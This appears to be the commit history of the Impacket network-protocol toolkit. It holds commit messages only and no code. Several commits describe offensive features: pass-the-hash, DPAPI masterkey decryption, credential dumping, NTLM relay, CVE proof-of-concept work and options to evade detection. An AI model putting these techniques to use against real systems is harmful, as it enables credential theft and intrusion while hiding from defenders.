Date:   Mon Jan 6 15:43:13 2020 -0300

    Merge pull request #727 from 0xdeaddood/timestamp
    
    Add the timestamp option to several scripts

commit bdf2e3d9d73858aa15db43c50fba7d3bb310c9eb
Merge: 6f1ac647 e32f6e3e
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Fri Jan 3 14:50:00 2020 -0300

    Merge pull request #739 from imaibou/imaibou-dpapi-rpc
    
    dpapi.py Add RPC masterkey decryption

commit 6f1ac64762f02ac4472e191c9a2ff8cc3c876bbd
Merge: f2546a0b 3bd51972
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Fri Jan 3 14:47:37 2020 -0300

    Merge pull request #738 from imaibou/imaibou-dpapi-pth
    
    dpapi.py add Pass the hash

commit e32f6e3e7572a800c2cbd70fc316582260accd63
Author: imaibou <ai_bounab@esi.dz>
Date:   Fri Jan 3 16:40:31 2020 +0100

    dpapi.py Add RPC masterkey decryption
    
    Added feature to decrypt a user's masterkey using the MS-BKRP (BackupKey Remote Protocol). This is already implemented in mimikatz to decrypt masterkeys using the /rpc flag (https://github.com/gentilkiwi/mimikatz/blob/172200295688ccbb76c44c6db0b3b47d39dd0d4d/modules/rpc/kull_m_rpc_bkrp.c#L51-L54)
    This makes an RPC call with the user's identity to the function BackuprKey on the DC. The GUID of this operation is BACKUPKEY_RESTORE_GUID and the details can be found on microsoft documentation here: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-bkrp/7accb903-3863-4385-9c99-11af8c18d656

commit 3bd51972cd8de6be933e50509e6c33c396e1bcc8
Author: imaibou <ai_bounab@esi.dz>
Date:   Fri Jan 3 15:39:09 2020 +0100

    dpapi.py add Pass the hash
    
    Added pass the hash support for backup key retrieval

commit 96b4fc476862c1ed8252ff8c35880b6bd4bcf0bc
Author: Maxime Nadeau <maxime.nadeau@outlook.com>
Date:   Thu Jan 2 11:25:25 2020 -0500

    Fixed the missing python 2 to python 3 conversions

commit e2fe6938dc9bc1f4f1b663fd8bb7c1f2286091cf
Author: Maxime Nadeau <maxime.nadeau@outlook.com>
Date:   Thu Dec 19 13:16:09 2019 -0500

    Possibility to rename the PSExec uploaded binary name to avoid entropy-based detection use cases

commit 906724ae566d4f918e375c9f57162c60dd29ecce
Author: Maxime Nadeau <maxime.nadeau@outlook.com>
Date:   Thu Dec 19 13:01:25 2019 -0500

    Added the -service-name flag to SMBExec to avoid BTOBTO-based detection use cases

commit 3b41d48e075fa011194e79cdba7287d4b83130d2
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Wed Dec 18 11:34:56 2019 -0300

    Add the timestamp option to several scripts
    - GetADUsers.py, GETNPUsers.py, getST.py, getTGT.py, goldenPac.py, secretsdump.py, ticketer.py

commit 97d2336d81f16e7c2cffaba8671dbfaa5eee4d36
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Wed Dec 18 09:13:27 2019 -0300

    Add the timestamp option to several scripts
    - lookupsid.py, netview.py, ntlmrelayx.py, raiseChild.py, samrdump.py, smbrelayx.py

commit 0f6713f8918eacc2a66db057af5455936892e36b
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Wed Dec 18 08:17:41 2019 -0300

    Add the timestamp option to the remote execution scripts

commit f2546a0bc54e9df11b3a7f225af069125218d359
Merge: c5183d42 a7365092
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Tue Dec 17 11:58:43 2019 -0300

    Merge pull request #723 from fox-it/strict_validation
    
    Add option for strict NTLM hostname validation in SMB transports

commit fff7bc368f5f4bcd8d93e16bcc807f6acdda968e
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Mon Dec 16 11:45:00 2019 -0300

    Modify help message

commit a32f917d73c67a0417e51ec6d45334707829fb91
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Mon Dec 16 10:17:40 2019 -0300

    Change parameter name and add exception handling (wrong RID)

commit e9c3022766eda7eb7509c9431edaa93ddf4561da
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Fri Dec 13 18:42:36 2019 -0300

    raiseChild: added new parameter to specify the RID of a user to dump credentials and, if target is specified, launch a PSEXEC shell

commit a736509259c9d78c382c2ad6d2e3b9f1c55b3b09
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Wed Dec 11 16:02:59 2019 +0100

    Add option for strict NTLM hostname validation in SMB transports

commit c5183d42b6cc0b05631612d350283a298f8159b2
Merge: 909238e9 1f2d203f
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Dec 11 10:13:26 2019 -0300

    Merge pull request #722 from fox-it/dpapi-merge
    
    improve support for key+sid in dpapi examples

commit 1f2d203f6f750b4a5ddf4de516ad8e7a56e0ac44
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Tue Dec 10 11:17:43 2019 +0100

    improve support for key+sid in dpapi examples

commit 909238e9eeaf3d15c2f1da06a74d71d648606f64
Merge: 7cdc0277 9738405f
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Dec 9 14:29:08 2019 -0300

    Merge pull request #720 from exploide/doc-smbserver-auth
    
    removed old documentation about smbserver not authenticating clients

commit da3b1f9419a78bb9a1804cd8e4f10e7104b4968a
Author: G0ldenGunSec <28241763+G0ldenGunSec@users.noreply.github.com>
Date:   Sun Dec 8 13:14:47 2019 -0600

    Update GetUserSPNs.py

commit 2397ec2465f068d93b172bc73c7bc7dcde872abd
Author: G0ldenGun <g0ldengunsec@gmail.com>
Date:   Sun Dec 8 13:08:15 2019 -0600

    Delegation Retrieval Functionality
    
    Added a column to GetUserSPNs.py that returns delegation information associated with the account.  Useful to help identify accounts to target & to expose additional potential attack paths.

commit 9738405f60e0ad144e6c6b577794432ad7adc119
Author: exploide <me@exploide.net>
Date:   Sun Dec 8 15:22:14 2019 +0100

    removed old documentation about smbserver not authenticating clients

commit 7cdc0277b90abbc055731fc8777b627bb90c18b7
Author: asolino <bethus@gmail.com>
Date:   Tue Dec 3 16:46:06 2019 -0300

    Adding -ts switch for this script.
    
    - Adds timestamp to every log line

commit 5a0edb3a36a5c7a5b5c12c1e545de70f2e101bcb
Author: asolino <bethus@gmail.com>
Date:   Tue Dec 3 16:43:17 2019 -0300

    Adding a ImpacketFormatterTimeStamp class
    
    - Usefull if you want to have a timestamp of every log line
    - Requires setting ts=True when calling logger.init()

commit 1c42cc1ccf68f0d924767a88ddd424950ecd5ec4
Merge: 97d66fb8 501c3d12
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Tue Dec 3 12:56:16 2019 -0300

    Merge pull request #718 from exploide/smbexec-codec
    
    Added codec parameter to smbexec.py

commit 97d66fb86b32834a947680494ae5f24629df480a
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Tue Dec 3 12:51:16 2019 -0300

    Update issue templates

commit a48af713208fb46f0e5113678ad1c51aa3e91a4c
Merge: 70371a41 c2209833
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Tue Dec 3 12:42:22 2019 -0300

    Merge pull request #716 from awsmhacks/patch-1
    
    Add an issue template

commit 70371a41a164733a10bbca53390f4ebf125da851
Merge: d65c0d22 8ae5cdb8
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Tue Dec 3 12:26:21 2019 -0300

    Merge pull request #707 from mpgn/patch-1
    
    Check if the type of the 'data' variable is already "bytes"

commit 501c3d126fc140e4fb03547836c5469df6544473
Author: exploide <me@exploide.net>
Date:   Tue Dec 3 15:57:21 2019 +0100

    updated Python docs URL to modern version

commit 37aaa25b87c233b165f92b3950d799830fb2012a
Author: exploide <me@exploide.net>
Date:   Tue Dec 3 15:54:27 2019 +0100

    smbrelayx.py: fixed typos in codec parameter description

commit 6170e27a07ba9abc27bbb763d8343327bb171736
Author: exploide <me@exploide.net>
Date:   Tue Dec 3 15:51:34 2019 +0100

    smbexec.py: added -codec parameter to deal with UnicodeDecodeErrors
    
    fixes #708

commit 172ab7cb5378ab1f3a06b1051362ec5e11e8b97b
Author: exploide <me@exploide.net>
Date:   Tue Dec 3 15:50:06 2019 +0100

    gitignore: ignore common virtualenv folders

commit c22098331559f6867755537d6a35889eec5c05aa
Author: Ryan <ryan.preston.01@gmail.com>
Date:   Mon Dec 2 13:32:12 2019 -0600

    Create bug_report.md
    
    Attempts to make issues uniform and include enough information.

commit a45e4a657de862c3236d9b9b134cb5241bd7676b
Author: Clément Notin <clement@notin.org>
Date:   Sat Nov 30 19:25:06 2019 +0100

    nmb.py: stop using select() in non_polling_read()
    
    Closes #649

commit d65c0d220a9613ae74db42adc9362a7947acdd66
Merge: fdc8ddd7 0a7ba186
Author: asolino <bethus@gmail.com>
Date:   Thu Nov 28 17:58:17 2019 -0300

    Merge branch 'slasyz-master'

commit 0a7ba186a04f0a2b1db8c32cf0497acae9cbad22
Author: Vyacheslav Syrovatsky <slasyz@gmail.com>
Date:   Thu Nov 28 17:14:28 2019 +0300

    Fix the warning added to Python 3.8: SyntaxWarning: "is" with a literal. Did you mean "=="?

commit 8f5ae81532ecc4ed49527a1ecb750d65e4628b10
Author: Vyacheslav Syrovatsky <slasyz@gmail.com>
Date:   Thu Nov 28 17:11:44 2019 +0300

    Add explicit digestmod parameter setting to all hmac.new() calls for Python 3.8 compatibility (issue SecureAuthCorp/impacket#702).

commit 8ae5cdb8478b0c29a2365b6e353ab2f17280390e
Author: mpgn <martial.puygrenier@gmail.com>
Date:   Wed Nov 27 09:24:22 2019 +0100

    Check if the type of the 'data' variable is already "bytes"
    
    If `data` is already a bytes then we cannot convert it to bytes again. This PR check if the the variable is not already a bytes
    
    Should fix issue #691

commit fdc8ddd76e6f5b418e87635d7a70b4e43cbc8081
Merge: 6822cc71 570f25de
Author: asolino <bethus@gmail.com>
Date:   Tue Nov 26 14:38:24 2019 -0300

    Merge branch 'master' of https://github.com/SecureAuthCorp/impacket

commit 6822cc713ea6749f84c9f71e5c4087120d530fb2
Author: asolino <bethus@gmail.com>
Date:   Tue Nov 26 14:37:23 2019 -0300

    Appending NULL byte instead of string
    
    - Should address https://github.com/SecureAuthCorp/impacket/issues/691

commit 141c675c9aebc97452e4220d7d2c7e807aaaa151
Author: Itamar <mizrahi.itamar@gmail.com>
Date:   Sun Nov 24 21:12:24 2019 +0200

    Fix messageId bug in ldap search request
    
    Hi,
    
    When using search method to find different type of objects (when the size of the results exceeded the maximum search limit) in small intervals between each request, I experienced some issue that the requests resulted mixed results. i.e. after initiating a requests for users, and requesting groups right afterwards, the group request returned users instead of groups.
    I did a little digging and noticed messageID was configured as 1 in LDAPConnection's constructor, and incremented after each successful search request.
    RFC specifically states: "A client MUST NOT send a request with the same messageID as an earlier request in the same LDAP session..".
    It made me realize that  when initiating multiple requests with the same LDAPConnection instance, it might result same messageId in different search requests, therefore returning the wrong response.
    The added code should fix this.
    
    Itamar

commit 570f25de5fee23f9c2290da4eaad8c29f82a20f9
Merge: caaa66a8 244a0c12
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Nov 21 18:15:59 2019 -0300

    Merge pull request #696 from awsmhacks/master
    
    Adds ability to choose computer name when using --add-computer

commit f79210ac35f42e5efb8510fc1342cecaec456ec3
Author: asolino <bethus@gmail.com>
Date:   Thu Nov 21 17:50:07 2019 -0300

    Minor code changes and grammar fixes

commit 0776ddbe028fc84730ca31804ea0f8d6b9ab7c92
Author: asolino <bethus@gmail.com>
Date:   Thu Nov 21 17:42:59 2019 -0300

    Updated copyright and removing unused import

commit bcbe4cacd024b5d62cd4a09e0778078698da5957
Merge: 10e2a2cc be6181e7
Author: asolino <bethus@gmail.com>
Date:   Thu Nov 21 17:40:10 2019 -0300

    Merge branch 'master' of https://github.com/jagotu/impacket

commit 244a0c12a7159168873dbb87fb8816a6f6ba9505
Author: awsmhacks <nomail>
Date:   Mon Nov 18 11:22:03 2019 -0600

    .

commit caaa66a818c911b621280fb59d6d7631d690ec0f
Merge: 10e2a2cc 9d0adf83
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Nov 14 12:34:58 2019 -0300

    Merge pull request #693 from danhph/master
    
    Correct the values of NETSETUP_JOIN_STATUS enum

commit 9d0adf8376d9a864a27fec9650cd56c94f50ee72
Author: Huu-Danh Pham <danhph@outlook.com>
Date:   Thu Nov 14 01:43:31 2019 -0600

    correct values of NETSETUP_JOIN_STATUS enum

commit 10e2a2cc3bd8c81e97c0aedb821cadab07ca6cbc
Author: asolino <bethus@gmail.com>
Date:   Tue Nov 5 15:35:28 2019 -0300

    Fix bug that prevented SMB -> SMB relay
    
    - Bug introduced this commit https://github.com/SecureAuthCorp/impacket/commit/e67019aa425bab01725788db0e8e51f011753026#diff-3df699770af5e22587f669bbca5ed00e
    - SMB -> SMB relay was working only when --remove-mic was enabled.
    - Addresses https://github.com/SecureAuthCorp/impacket/issues/685

commit f38b68ac78639a9dc0e7c12eb2db38a9c6acbef9
Merge: d84b8d32 5a6a7882
Author: asolino <bethus@gmail.com>
Date:   Mon Oct 7 16:45:03 2019 -0300

    Merge branch 'rxwx-master'

commit 5a6a78828eb54faeda8e1feb9ac9371904d637fc
Author: rxwx <richard.warren@nccgroup.trust>
Date:   Wed Oct 2 13:09:41 2019 +0100

    Fix python 3 compat issues

commit e531093f772179389765539090e091b98e2553c2
Author: rxwx <richard.warren@nccgroup.trust>
Date:   Mon Sep 30 19:40:29 2019 +0100

    Add snapshot support to retrieveFile

commit 08039fad4321a4495d9231a6e3c3a24f46008978
Author: rxwx <richard.warren@nccgroup.trust>
Date:   Mon Sep 30 18:09:59 2019 +0100

    Add feature to listPath to allow for listing directories decorated with a @GMT timestamp value

commit 1c8544f23e7632471b588190742558b217d079fe
Author: rxwx <richard.warren@nccgroup.trust>
Date:   Fri Sep 27 15:40:42 2019 +0100

    python3 compatibility

commit dc70bccdd592acb58319d555012d0217f8e5f99d
Author: rxwx <richard.warren@nccgroup.trust>
Date:   Fri Sep 27 15:33:35 2019 +0100

    Return a list of snapshots from listSnapshots

commit da7673b6db60be25852c4242847e2b8862775cc2
Author: rxwx <richard.warren@nccgroup.trust>
Date:   Fri Sep 27 09:33:23 2019 +0100

    Add FSCTL_SRV_ENUMERATE_SNAPSHOTS functionality to smbconnection, and a list_snapshots command to smbclient

commit d84b8d32d6358a6069813fe7f3e1ac4b2694f60d
Author: asolino <bethus@gmail.com>
Date:   Thu Sep 26 15:21:47 2019 -0300

    OneCmd returns None, there shouldn't be an output parse
    
    - Should address https://github.com/SecureAuthCorp/impacket/issues/676

commit 5cb6389cba53ebd0f7e91491e62964ec33ea5069
Author: asolino <bethus@gmail.com>
Date:   Wed Sep 25 15:45:16 2019 -0300

    And going back to dev ;)

commit 647d7be7cb1328ea69340d3b689693220cd5762f
Author: asolino <bethus@gmail.com>
Date:   Wed Sep 25 14:20:16 2019 -0300

    Tagging new release
    
    - It'll just last a few minutes till we come back to -dev :P

commit be6181e7fec5528f94d36e00038f2d3f525f1399
Author: JaGoTu <jagotu@gmail.com>
Date:   Tue Sep 24 13:10:24 2019 +0200

    Addcomputer: Workaround for python bug
    
    https://bugs.python.org/issue11874

commit 02089dc442f80b4ee06b95333cf268ff9997575a
Merge: afa2825d 149ba19b
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Sep 23 16:09:26 2019 -0300

    Merge pull request #675 from MrAnde7son/patch-12
    
    Add support for all info types query\set info request

commit 149ba19b391cdc56cbcb6e0927b4e74ad42d11e2
Author: Itamar <mizrahi.itamar@gmail.com>
Date:   Sun Sep 22 11:01:14 2019 +0300

    Add support for all info types in QUERY_INFO request
    
    Hi,
    
    in SMB2QueryInfo the infoType field was statically set to SMB2_0_INFO_FILE. In order to query security descriptor and more, I change it to use the actual infoType parameter passed to the function.

commit afa2825d94482b6b138ad20681c2d9dd77ac2470
Merge: 75250d73 ec7aaa47
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Sep 18 12:03:45 2019 -0300

    Merge pull request #674 from MrAnde7son/patch-11
    
    Fix bug in RQueryServiceObjectSecurity

commit ec7aaa470cbe2d34790e10a1027bcac2f8d0a62f
Author: Itamar <mizrahi.itamar@gmail.com>
Date:   Wed Sep 18 14:37:21 2019 +0300

    Fix bug in RQueryServiceObjectSecurity
    
    Hi,
    
    RQueryServiceObjectSecurity structure wasn't configured properly. The array of the actual security descriptor was defined as the whole response, so it wasn't able to unpack 'pcbBytesNeeded' properly. I fixed this and the handling of insufficient buffer size (cbBufSize is smaller than the size of the security descriptor).

commit 75250d7366cfff7727cb67df6b2536327a4f6989
Merge: 11ff3d4e fc725c5e
Author: asolino <bethus@gmail.com>
Date:   Wed Sep 11 11:30:28 2019 -0300

    Merge branch 'c0d3z3r0-for_upstream/unicode_fix'

commit fc725c5ef7fa4ba2c7491587c3328f05564ba5ef
Merge: 11ff3d4e bdaea1c9
Author: asolino <bethus@gmail.com>
Date:   Tue Sep 10 15:22:08 2019 -0300

    Merge branch 'for_upstream/unicode_fix' of https://github.com/c0d3z3r0/impacket into c0d3z3r0-for_upstream/unicode_fix

commit 11ff3d4e023e31d0ba0fcd77ad3ecb7439a24492
Merge: 80ca7241 0dc38645
Author: asolino <bethus@gmail.com>
Date:   Tue Sep 10 15:16:07 2019 -0300

    Merge branch 'c0d3z3r0-for_upstream/python3_error_msg'

commit 0dc38645b60c330ff5b2cee88e3ef82805fb187a
Author: asolino <bethus@gmail.com>
Date:   Tue Sep 10 15:15:43 2019 -0300

    raising the exception the Py3 way

commit c0664ea4c49e969b639d980c9d4e111f5d460df1
Author: Michael Niewöhner <michael.niewoehner@8com.de>
Date:   Wed Sep 4 10:56:59 2019 +0200

    Fix broken error message introduced by python3 port
    
    Signed-off-by: Michael Niewöhner <michael.niewoehner@8com.de>

commit bdaea1c904ce45bb36b058ecb0d1a1bf370fc760
Author: Michael Niewöhner <michael.niewoehner@8com.de>
Date:   Wed Sep 4 13:18:04 2019 +0200

    Fix unicode errors caused by python2/3 incompatibility
    
    Signed-off-by: Michael Niewöhner <michael.niewoehner@8com.de>

commit 66c76985ad924b82142e2a9715366b76a6a1c3f8
Author: Jan Gocník <jagotu@gmail.com>
Date:   Fri Aug 23 15:20:03 2019 +0200

    AddComputer: new example script
    
    AddComputer.py can add a computer to a domain using LDAP or SAMR (SMB)

commit 80ca724120ec92208468431dba1c51b6f109da3b
Author: asolino <bethus@gmail.com>
Date:   Tue Aug 20 14:09:15 2019 -0300

    Do not enconde the string to bytes when changing drive letter.
    
    - Should address https://github.com/SecureAuthCorp/impacket/issues/666

commit c9f26f6861c8714d788ae937a3ce0f64d748ed04
Merge: 27065c57 a0ad462c
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Aug 12 16:56:11 2019 -0300

    Merge pull request #665 from n1ngod/master
    
    fix the import path of hLsarOpenPolicy2

commit a0ad462c492285fb1d48e544c08a41dd94bd8bd8
Author: n1ngod <zhangning9500@gmail.com>
Date:   Mon Aug 12 17:51:07 2019 +0800

    fix the import path of hLsarOpenPolicy2

commit 27065c5789b996bb64487537db391015203ed17d
Merge: 652dfc4a 93c4d2c9
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Jul 18 17:49:46 2019 -0300

    Merge pull request #652 from salu90/webdav
    
    Added NTLM relays leveraging Webdav authentications

commit 93c4d2c969b136bc2fbaa2f1945a256fae776625
Author: salu90 <simone.salucci@gmail.com>
Date:   Wed Jul 17 11:14:02 2019 +0200

    added webdav capabilities and relay

commit 652dfc4a43c56e96f147237d4587d9834449a241
Merge: 9e54b026 1e40a643
Author: asolino <bethus@gmail.com>
Date:   Thu Jul 11 16:05:45 2019 -0300

    Merge branch 'stuken-nested_obj_value_fix'

commit 1e40a643e6b1979847a71e075fff326b48194bee
Merge: 9e54b026 3b8027d9
Author: asolino <bethus@gmail.com>
Date:   Thu Jul 11 14:50:02 2019 -0300

    Merge branch 'nested_obj_value_fix' of https://github.com/stuken/impacket into stuken-nested_obj_value_fix

commit 9e54b0261cc03b45602d62274122a747fc7a27f7
Author: asolino <bethus@gmail.com>
Date:   Thu Jul 11 14:44:33 2019 -0300

    Minor changes
    
    - chmod +x
    - Adding exec #!
    - Adding impacket banner
    - Fixing code style proposed by pyCharm

commit 3bd5338ce37eb40c9ec3c6879a5b587599ac616c
Merge: 2f2db662 cb44903e
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Jul 11 14:39:15 2019 -0300

    Merge pull request #647 from iboukris/s4u2else
    
    A tool for testing CVE-2018-16860 and CVE-2019-0734

commit cb44903ea9731b5bba05cee5c8d9e1990305f788
Author: Isaac Boukris <iboukris@gmail.com>
Date:   Wed Jul 3 22:53:30 2019 +0300

    A tool for intercepting krb5 connections
    
    and for testing KDC handling S4U2Self with unkeyed checksum.
    
    See CVE-2018-16860 and CVE-2019-0734
    
    Signed-off-by: Isaac Boukris <iboukris@gmail.com>

commit 2f2db662bae0919251b959d76ef42269dd522def
Author: asolino <bethus@gmail.com>
Date:   Wed Jul 3 13:20:58 2019 -0300

    Completing CVE-2019-1019 attribution.

commit 398b9e5b5d4cf03f8691ed553f1fa8833ab641dc
Author: asolino <bethus@gmail.com>
Date:   Wed Jul 3 13:19:26 2019 -0300

    Adjusting messages

commit 3b8027d93f8938901a7fc61d7842f10feb01119b
Author: Stuart Kenny <stuart.kenny@iquate.com>
Date:   Tue Jul 2 12:21:28 2019 +0100

    Do not overwrite default values with 0

commit b129807bd0c5dd860e176a726f376e5570067164
Author: asolino <bethus@gmail.com>
Date:   Mon Jun 24 09:46:58 2019 -0300

    Clarifying some messages when signing is required

commit abd1fe7e072383ff1b4c575ec1f21779c9890fea
Author: asolino <bethus@gmail.com>
Date:   Mon Jun 24 09:40:18 2019 -0300

    Removing unused variable
    
    - Plus fixing bug that wasn't showing the domain we're connecting when using the NETLOGON approach to get signing keys

commit e7461f6dbf448084b00230cc6fcd192f9c2baa08
Merge: e71424cd 24102b40
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Jun 20 11:43:24 2019 -0300

    Merge pull request #641 from franferrax/master
    
    Adjust 5257b9d changes to dtypes.STR to work in Python 2 & 3

commit 24102b40d98216270c1f0c3c7f8a5db4040d03a9
Author: fferrari <fferrari@coresecurity.com>
Date:   Wed Jun 19 19:52:46 2019 -0300

    Making 5257b9d changes to dtypes.STR work in Py 2 & 3
    Also handling raw buffers in dtypes.STR.__getitem__()

commit e71424cdfe310275d377ee2646f78d9717b5e478
Merge: fc51af45 25f02602
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Sat Jun 15 10:44:39 2019 -0300

    Merge pull request #637 from dirkjanm/micremove
    
    Mic remove - CVE-2019-1040

commit 25f02602eee6d923a65127b1e80cb592b8cac32d
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Sat Jun 15 11:37:40 2019 +0200

    Fix bug in CVE-2019-1019 ntlmrelayx code

commit e67019aa425bab01725788db0e8e51f011753026
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Thu Jun 13 21:36:13 2019 +0200

    Added POC code for CVE-2019-1040

commit fc51af452156fc8fd9d31a9b31541f6859e76ae1
Merge: d6b5bd4e 2e9dc77d
Author: asolino <bethus@gmail.com>
Date:   Thu Jun 13 19:10:39 2019 -0300

    Merge branch 'msimakov-CVE-2019-1019'

commit 2e9dc77d7a74329c318b5bf9add647600752c967
Author: asolino <bethus@gmail.com>
Date:   Thu Jun 13 19:10:22 2019 -0300

    Minor cosmetic changes and code attribution

commit cb311ef2660e4c0675fa7b5bf68997dc0461b7ce
Author: asolino <bethus@gmail.com>
Date:   Thu Jun 13 18:24:33 2019 -0300

    Add SMBv1 support + MIC Calculations improvements
    
    - Changed enable_signing for set_session_key as previously used
    - MIC calculations are stored using the original type3 message, in order to avoid changes when marshaling back again using impacket.

commit 5257b9dfbd2db13878313ad0bc58754b8ac50820
Author: Marina Simakov <msimakov@preempt.com>
Date:   Thu Jun 13 16:30:26 2019 +0300

    CVE-2019-1019: Bypass SMB singing for unpatched machines

commit d6b5bd4e2f3fe3e9fa252dcd2a1dd76faa0c5395
Author: asolino <bethus@gmail.com>
Date:   Wed May 29 14:42:40 2019 -0300

    Let's try w/o decoding Unicode
    
    - We should actually do what we meant.
    - Should address https://github.com/SecureAuthCorp/impacket/issues/631

commit c2a92c536f76f8581497308201f67316f54112ae
Merge: 50ccbf9f eaca9bee
Author: Zer1t0 <Zer1t0@mail.com>
Date:   Mon May 27 13:27:11 2019 +0200

    merged with master

commit eaca9beeae8c882209115e00408ba65b3861fd51
Merge: 25a37a24 f67caa7a
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu May 23 12:26:57 2019 -0300

    Merge pull request #630 from iptwLcP9/dhcp-fix
    
    Adjust the option domain-search-list to be synchronized with its definition in the RFC 3397

commit f67caa7a60ea1f3a92e7255182cbe72e5420a6f4
Author: iptwLcP9 <iptwLcP9>
Date:   Thu May 23 17:13:36 2019 -0300

    Adjust the option domain-search-list to be synchronized with its definition in the RFC 3397

commit 25a37a242156d1773fad9ad98a9aeb4851ca3051
Author: asolino <bethus@gmail.com>
Date:   Wed May 22 19:24:15 2019 -0300

    Adjusting lmhash, nthash and aesKey to Python3 binary data
    
    - Thought I already did it but there are some use cases that weren't working, so a more safer approach is taken now (i.e. converting everything to binary at the very beginning)
    - This should address https://github.com/SecureAuthCorp/impacket/issues/628

commit 87e0b7f2aa26b8abdcb18ddd1fac3f964a1a0d03
Merge: 7dd9096e 1c4f9d49
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Tue May 21 15:08:43 2019 -0300

    Merge pull request #627 from cnotin/patch-1
    
    Nice catch @cnotin! Merging: smbserver.py: fix order of "computer\username" in log messages

commit 1c4f9d49757c68bbcf7a0c3b4c99a265d7880374
Author: Clément Notin <clement@notin.org>
Date:   Tue May 21 18:32:04 2019 +0200

    smbserver.py: fix order of "computer\username" in log messages

commit 7dd9096e799ca7d100b62f1758985c6757265023
Merge: 018f9ecd 9b57fa47
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed May 15 15:01:21 2019 -0300

    Merge pull request #621 from SR4ven/fix_dependencies
    
    Fixed broken ldap3 requirement

commit 018f9ecd6ab4641321549b8ba651a48c246090f9
Merge: ec9d119d 8eea8c25
Author: asolino <bethus@gmail.com>
Date:   Wed May 15 14:58:28 2019 -0300

    Merge branch 'cnotin-patch-1'

commit 8eea8c257e5452dd3ce565b684edca68c08e8e1e
Author: Clément Notin <clement@notin.org>
Date:   Fri May 10 18:00:53 2019 +0200

    nmb: add timeout for whole read operation in non_polling_read

commit 9b57fa47dda1311f0bb800ab498700d5c0efeef1
Author: SR4ven <46794237+SR4ven@users.noreply.github.com>
Date:   Fri May 10 17:47:18 2019 +0200

    Moved pip check from tavis to tox

commit d1ba169fa2efabdd18e62d5e2407eecfd4525cb8
Author: SR4ven <46794237+SR4ven@users.noreply.github.com>
Date:   Fri May 10 17:08:59 2019 +0200

    Fixed broken ldap3 requirement

commit ec9d119d102251d13e2f9b4ff25966220f4005e9
Merge: 335f25e2 b1458ce7
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Tue May 7 14:10:29 2019 -0300

    Merge pull request #615 from cnotin/patch-2
    
    Add STYPE_MASK constant

commit 335f25e22c62072fdb8bebc55f710462ed1eb18a
Merge: 9bd28ec5 cd58aedc
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Tue May 7 13:21:43 2019 -0300

    Merge pull request #606 from cclauss/patch-1
    
    Travis CI: Test on Python 3.7 and flake8 3.7

commit 9bd28ec596f834404c27c1a8e778580d94294f6f
Merge: e8e55a20 82f24470
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Tue May 7 13:10:07 2019 -0300

    Merge pull request #619 from eamanu/patch-1
    
    Dummy clean on file

commit 82f2447004ddc1fa0193a232b88a292a8c0f83d8
Author: Emmanuel Arias <emmanuelarias30@gmail.com>
Date:   Sat May 4 21:09:26 2019 -0300

    Dummy clean on file
    
    This is a lazy change. Delete commented and unused lines.

commit e8e55a2092690957f852c142459be0a0e101187c
Merge: c2de18c5 1f1baeab
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Sun Apr 28 16:03:26 2019 -0300

    Merge pull request #598 from cnotin/patch-1
    
    smb3: fix the check to not encrypt anonymous connection

commit c2de18c5573228eff238ade5fd93fd71ff4f4b53
Merge: 9362abfe a0ca1af5
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Sun Apr 28 16:02:06 2019 -0300

    Merge pull request #616 from cclauss/patch-2
    
    Remove trailing backslash in remcomsvc.py

commit 9362abfea97d13b942bfdc117d43c47053f00134
Merge: 434c8680 cb7793b3
Author: asolino <bethus@gmail.com>
Date:   Sun Apr 28 16:00:49 2019 -0300

    Merge branch 'mikeryan-win2016-multiple-peks'

commit cb7793b377948103bc08d5483f2bd4e1207f8d62
Author: Mike Ryan <mikeryan@lacklustre.net>
Date:   Thu Apr 25 19:55:15 2019 -0700

    support multiple PEKs in Windows 2016
    
    __decryptHash was throwing IndexError on Windows 2016 if a hash was
    encrypted with a PEK with a higher index than 0. This patch attempts to
    extract all keys from the PEK list. The PEK list format was reverse
    engineering by eyeball. YMMV.

commit 434c8680f6e8dd9e459ca86612658e3efaac7976
Author: asolino <bethus@gmail.com>
Date:   Tue Apr 23 09:00:07 2019 -0300

    ConfigParse should always receive strings, not ints
    
    - Shown under Python3 (Python2 doesn't care)
    - Addresses https://github.com/SecureAuthCorp/impacket/issues/617
    - Also fixed another minor Python2/3 dict port

commit a0ca1af5afcf1c8885d17fc4085ac79b5b2c7f1f
Author: cclauss <cclauss@me.com>
Date:   Thu Apr 18 17:08:43 2019 +0200

    Remove trailing backslash in remcomsvc.py

